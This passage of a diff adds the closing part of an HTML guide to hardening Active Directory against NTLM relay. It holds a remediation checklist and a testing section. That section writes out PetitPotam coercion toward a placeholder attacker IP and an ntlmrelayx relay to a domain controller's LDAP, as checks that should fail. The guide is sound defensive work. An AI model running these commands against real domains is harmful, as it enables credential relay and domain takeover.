+                    <input type="checkbox" id="check3">
+                    <label for="check3">Remediate unsigned LDAP clients</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check4">
+                    <label for="check4">Enforce LDAP signing</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check5">
+                    <label for="check5">Enforce LDAP channel binding</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check6">
+                    <label for="check6">Disable Print Spooler on DCs</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check7">
+                    <label for="check7">Apply coercion patches</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check8">
+                    <label for="check8">Implement RPC filters</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check9">
+                    <label for="check9">Enable NTLM auditing</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check10">
+                    <label for="check10">Audit NTLM usage for 2-4 weeks</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check11">
+                    <label for="check11">Add necessary NTLM exceptions</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check12">
+                    <label for="check12">Add sensitive accounts to Protected Users</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check13">
+                    <label for="check13">Restrict NTLM domain-wide</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check14">
+                    <label for="check14">Set MachineAccountQuota to 0</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check15">
+                    <label for="check15">Monitor msDS-KeyCredentialLink changes</label>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 6: Testing -->
+        <section id="testing" class="section">
+            <div class="section-number">Section 06</div>
+            <h2>Testing Your Hardening</h2>
+
+            <p>After implementing controls, validate they work using these tests:</p>
+
+            <h3>Test LDAP Signing Enforcement</h3>
+            <pre data-lang="Bash"><code># From Linux - should fail after enforcement
+ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local"</code></pre>
+
+            <h3>Test PetitPotam is Blocked</h3>
+            <pre data-lang="Bash"><code># Should fail or be blocked
+python3 PetitPotam.py attacker_ip dc01.domain.local</code></pre>
+
+            <h3>Test NTLM Relay is Blocked</h3>
+            <pre data-lang="Bash"><code># Should fail to relay
+ntlmrelayx.py -t ldap://dc01.domain.local</code></pre>
+
+            <div class="alert alert-success">
+                <span class="alert-icon">✅</span>
+                <div class="alert-content">
+                    <strong>Success Criteria</strong>
+                    <p>All tests above should fail or be blocked once hardening is complete. Document your test results for compliance purposes.</p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>AD Relay Attack Hardening Guide</p>
+        <p style="margin-top: 0.5rem;">References: <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-signing-requirements" target="_blank">Microsoft LDAP Signing</a> • <a href="https://support.microsoft.com/en-us/topic/kb5005413" target="_blank">KB5005413 PetitPotam</a></p>
+    </footer>
+
+    <script>
+        // Save checkbox state to localStorage
+        document.querySelectorAll('.checklist-item input').forEach(checkbox => {
+            const saved = localStorage.getItem(checkbox.id);
+            if (saved === 'true') checkbox.checked = true;
+            
+            checkbox.addEventListener('change', () => {
+                localStorage.setItem(checkbox.id, checkbox.checked);
+            });
+        });
+
+        // Smooth scroll for nav links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                const headerOffset = 80;
+                const elementPosition = target.getBoundingClientRect().top;
+                const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+                window.scrollTo({
+                    top: offsetPosition,
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+</body>
+</html>
